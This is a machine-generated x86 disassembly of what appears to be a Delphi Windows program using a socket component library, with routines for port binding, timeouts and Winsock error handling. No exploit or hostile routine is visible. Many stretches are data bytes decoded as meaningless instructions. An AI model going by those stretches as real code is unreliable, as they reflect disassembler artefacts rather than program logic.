push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax * 2 ] bl
or al 0x0
pushfd
pop ebx
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx * 2 + 0xc0047 ] bl
dec ebp
add [ eax ] al
inc esp
inc [ esi ]
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
pop ebx
inc edi
add [ eax + eax ] cl
outsd
jb r-xdata
outsb
je r-xdata
add [ 0x65696c43 ] cl
add [ eax ] al
or eax 0x65696c43
outsb
je r-xdata
popad
outsb
insb
add al 0x0
push esp
adc [ eax ] al
and al 0x0
add bh bh
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
dec esi
outsd
je r-xdata
add [ eax ] al
push eax
pop ebx
inc edi
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x24479c2e
xor al [ eax ]
adc eax 0x43644945
inc eax
add [ eax ] al
pop esp
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
inc edi
add [ eax + eax ] cl
inc eax
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x24479bca
xor al [ eax ]
adc al 0x45
dec ecx
push ebx
outsd
dec ebp
popad
js r-xdata
add [ ebx - 0xf7743d ] ecx
push ecx
and [ eax + 0x7400107b ] al
or [ edx - 0x173c74ff ] esi
xlat
add al 0x0
add [ ecx + rw-data ] ah
dec ecx
outsb
push edx
popad
outsb
lea eax [ bx + si ]
int3
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x24479c92
xor al [ eax ]
sbb [ ebp + 0x49 ] al
inc ebx
popad
outsb
dec esi
outsd
je r-xdata
imul ebp [ esi + 0x64 ] 0x6b636f53
je r-xdata
outsd
jne r-xdata
add [ esp + esi + 0x31cc0040 ] al
inc eax
add al ch
xor [ eax ] eax
and al 0x32
inc eax
add [ 0x43644945 ] dl
popad
outsb
insb
inc ebp
jb r-xdata
imul esp [ ebp + 0x6e ] 0x726f5074
je r-xdata
add bh bh
add [ eax ] eax
adc [ eax ] al
adc al 0x0
add bh bh
adc al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add cl [ ecx + 0x50 ]
push esp
adc [ eax ] al
sbb al 0x0
xor al 0x40
add [ esp + esi + 0x34900040 ] cl
inc eax
add [ esp + esi + 0x31cc0040 ] al
inc eax
add al ch
xor [ eax ] eax
and al 0x32
inc eax
add [ ebx ] dl
inc ebp
dec ecx
dec ecx
outsb
jbe r-xdata
imul ebp [ esi + 0x64 ] 0x74726f50
arpl [ ebx + 0x65 ] bp
je r-xdata
shl [ esp + ebx * 2 + 0x47 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
inc edi
add [ eax + eax ] cl
add [ eax ] al
push eax
pop ebx
inc edi
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 2 + 0x47 ] ah
outsd
jb r-xdata
add bh bh
sbb al 0x0
imul ebp [ esi + 0x54 ] 0x28004010
add [ eax ] al
[ eax ]
add [ ebx + 0x308b0c53 ] cl
call [ esi + 0x64 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
retn
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x61527472
outsb
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x50
outsd
jb r-xdata
mov eax [ eax ]
mov ecx edi
mov edx esi
call sub_472068
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl 0x1
mov eax ebx
call sub_4761d8
sub_475c84
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_475ce0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov edx esi
call sub_472068
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_4761d8
sub_475d50
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edx
mov edx [ ebx + 0xc ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_476190
mov eax ebx
call sub_4761b4
sub_475d88
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41adf4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_475db8
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x48 ]
pop ebx
pop ebp
retn 0x4
sub_475ddc
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x54 ]
pop ebx
pop ebp
retn 0x4
sub_475e00
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx esi
mov edx [ ebx + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x5c ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_472014
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_475e40
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x4c ]
pop ebx
pop ebp
retn 0xc
sub_475e6c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403988#7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax ebx
call sub_476208
test al al
jne r-xdata
cmp [ ebx + 0x24 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475f87
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_40402c
retn
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov eax [ ebx + 0x24 ]
cmp eax [ ebx + 0x28 ]
jle r-xdata
mov eax ebx
call sub_47625c
test al al
jne r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebx + 0x28 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_4039c0
jmp r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebx + 0x28 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_4039c0
jmp r-xdata
sub_475f8c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebx + 0x18 ]
mov edx esi
call sub_40405c
mov [ ebx + 0x20 ] edi
pop edi
pop esi
pop ebx
retn
sub_475fa8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_41adbc
mov dl 0x1
mov eax edi
call sub_4761d8
xor eax eax
mov [ edi + 0x24 ] eax
xor eax eax
mov [ edi + 0x28 ] eax
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
test bl bl
je r-xdata
mov eax [ esi + 0x1c ]
mov [ edi + 0x1c ] eax
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_476000
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403988#5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ r-xdata ]
call sub_4742c8
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push j_sub_403988#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41a30c
push 0x0
push esi
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x50 ]
dec eax
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
sete dl
xor ecx ecx
mov eax [ r-xdata ]
call sub_474284
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403234
retn
cmp esi 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
cmp esi eax
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x34 ]
mov eax ebx
call sub_476000
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx esi
sub edx eax
mov eax ebx
call sub_476000
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476138
lea eax [ ebp - 0xc ]
call sub_404008
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x34 ]
sub_476144
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40317c
mov edi eax
mov eax esi
call sub_40317c
cmp edi eax
je r-xdata
lea eax [ ebx + 0x14 ]
mov edx [ esi + 0x14 ]
call sub_40405c
mov eax [ esi + 0x1c ]
mov [ ebx + 0x1c ] eax
lea eax [ ebx + 0x18 ]
mov edx [ esi + 0x18 ]
call sub_40405c
mov eax [ esi + 0x20 ]
mov [ ebx + 0x20 ] eax
mov edx esi
mov eax ebx
call sub_41aa64
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_476190
push ebx
push ecx
lea edx [ eax + 0x14 ]
push edx
lea edx [ eax + 0x1c ]
push edx
lea ecx [ esp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x74 ]
pop edx
pop ebx
retn
sub_4761b4
push ebx
push ecx
lea edx [ eax + 0x18 ]
push edx
lea edx [ eax + 0x20 ]
push edx
lea ecx [ esp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x70 ]
pop edx
pop ebx
retn
sub_4761d8
push ebx
mov ebx eax
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0xc ] 0xffffffff
test dl dl
je r-xdata
lea eax [ ebx + 0x18 ]
call sub_404008
xor eax eax
mov [ ebx + 0x20 ] eax
pop ebx
retn
lea eax [ ebx + 0x14 ]
call sub_404008
xor eax eax
mov [ ebx + 0x1c ] eax
sub_476208
push ebx
push esi
push ecx
mov esi eax
push 0x0
mov eax [ esi + 0x14 ]
push eax
mov eax [ esi + 0x1c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx 0x2
mov edx [ esi + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx eax
mov [ esp + 0x4 ] 0x2740
lea ecx [ esp + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_472020
mov ebx eax
xor bl 0x1
test bl bl
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_476190
sub_47625c
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov edi [ ebp + 0x28 ]
mov esi [ ebp + 0x24 ]
sub esi edi
jg r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
dec esi
dec edi
inc esi
jne r-xdata
mov bl 0x1
jmp r-xdata
mov [ ebp + 0x1c ] edi
mov eax ebp
call sub_476208
test al al
je r-xdata
sub_47628c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4762b1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4762b8
retn
sub_4762c4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4762e9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4762f0
retn
sub_4762fc
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403988#4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476328
retn
sub_476334
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_476359
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476360
retn
sub_47636c
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403988#3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476398
retn
sub_4763a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4763c9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4763d0
retn
sub_47651c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x65 ] bh
inc edi
add [ eax ] cl
add [ eax ] al
in al 0x8b
inc ecx
add [ esp + esi + 0x40 ] bh
add [ eax ] dl
add al 0x42
add [ esp + esi + 0x34900040 ] cl
inc eax
add [ esp + esi + 0x31cc0040 ] al
inc eax
add al ch
xor [ eax ] eax
test al 0x3
inc edx
add ah al
add al 0x42
add [ ebx + ebp * 2 + 0xe0047 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
int3
sub_4765ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_476712
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi 0xfffffffe
sete bl
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4202d8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403988#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov eax [ ebp - 0x4 ]
call sub_420640
mov eax [ r-xdata ]
call sub_4742c8
test al al
je r-xdata
mov edi 0x7d
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
mov edx 0x7d
call sub_473a34
mov edi eax
jmp r-xdata
cmp edi esi
jge r-xdata
lea esi [ edi + 0x1 ]
test bl bl
je r-xdata
mov eax esi
call sub_473d40
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax edi
call sub_473d40
sub esi edi
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_420668
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_420670
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_4042c8
test eax eax
jle r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_474284
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
lea esi [ edi + 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4766fc
mov eax [ ebp - 0x4 ]
call sub_403234
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
jmp r-xdata
cmp edi esi
jl r-xdata
xor esi esi
jmp r-xdata
sub_476720
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4768f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_476af8
mov al [ eax + 0x7c ]
dec eax
sub al 0x3
jae r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4040a0
mov edi [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_476af8
mov edx [ eax + 0x6c ]
lea eax [ ebp - 0x10 ]
call sub_4040a0
mov eax [ ebp - 0x4 ]
call sub_476af8
mov edi [ eax + 0x74 ]
jmp r-xdata
lea ecx [ ebp - 0x1c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x10 ]
call sub_472160
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx edi
call sub_475f8c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
push 0x0
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_474620
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push esi
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_474918
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x68 ]
xor ecx ecx
mov edx 0x1
mov eax ebx
call sub_475ce0
lea eax [ ebx + 0x14 ]
mov edx [ ebp + 0x18 ]
call sub_40405c
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x24 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x28 ] eax
mov eax ebx
call sub_475e6c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x10 ]
call sub_47260c
test al al
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_474620
cmp esi 0xffffffff
je r-xdata
mov eax [ rw-data ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx 0x1
mov edx 0x6
call sub_475e00
mov eax [ r-xdata ]
call sub_4742c8
test al al
je r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_472014
jmp r-xdata
push ebp
mov eax 0x1d4c0
call sub_4765ac
pop ecx
jmp r-xdata
push ebp
mov eax esi
call sub_4765ac
pop ecx
mov eax [ ebp - 0x4 ]
call sub_476af8
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_47599c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4768f8
lea eax [ ebp - 0x1c ]
call sub_404008
lea eax [ ebp - 0x10 ]
call sub_404008
retn
sub_476918
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_474508
mov [ esi + 0x6c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_476954
push ebx
mov ebx eax
mov eax ebx
call sub_474950
mov eax [ ebx + 0x68 ]
test eax eax
jne r-xdata
mov dl 0x1
call sub_4761d8
pop ebx
retn
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_475fa8
mov [ ebx + 0x68 ] eax
pop ebx
retn
sub_476990
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_476a00
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
push 0x0
mov edx esi
mov ecx edi
mov eax [ ebx + 0x68 ]
call sub_475db8
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476a07
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_476a10
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_476a80
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
push 0x0
mov edx esi
mov ecx edi
mov eax [ ebx + 0x68 ]
call sub_475ddc
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476a87
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_476a90
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov [ ebx + 0x70 ] esi
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x70 ]
test eax eax
je r-xdata
mov eax ebx
call sub_476af8
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax esi
mov [ ebx + 0x70 ] eax
mov edx ebx
call sub_4207e4
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_476af8
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
xor eax eax
mov [ ebx + 0x70 ] eax
lea eax [ ebx + 0x70 ]
call sub_40d524
mov eax [ ebx + 0x70 ]
mov [ eax + 0x80 ] ebx
pop esi
pop ebx
retn
sub_476af8
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x70 ]
pop ebx
retn
cmp [ ebx + 0x70 ] 0x0
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47514c
mov [ ebx + 0x70 ] eax
sub_476b20
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax [ esi + 0x70 ]
test eax eax
je r-xdata
lea eax [ esi + 0x68 ]
call sub_40d524
mov edx ebx
and dl 0xfc
mov eax esi
call sub_474920
test bl bl
jle r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
lea eax [ esi + 0x70 ]
call sub_40d524
sub_476b64
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_420a30
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x70 ]
jne r-xdata
xor eax eax
mov [ esi + 0x70 ] eax
sub_476b8c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403800#5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov edx eax
mov [ ebp - 0xc ] 0x2719
mov [ ebp - 0x8 ] 0x2736
lea ecx [ ebp - 0xc ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_472020
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_420668
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_476be6
add [ eax ] eax
add [ eax ] al
jl r-xdata
add [ edi + ebp * 2 ] cl
inc edi
add [ eax + 0x476d ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl al
outsb
inc edi
add [ ebx + eax ] bh
add [ eax ] al
mov ah 0x83
inc ebp
add [ eax - 0x2bffbdf2 ] bl
scasd [ edi ]
inc ebp
add [ eax - 0x6fffba4f ] cl
xor al 0x40
add ah dh
aad 0x45
add ah cl
xor [ eax ] eax
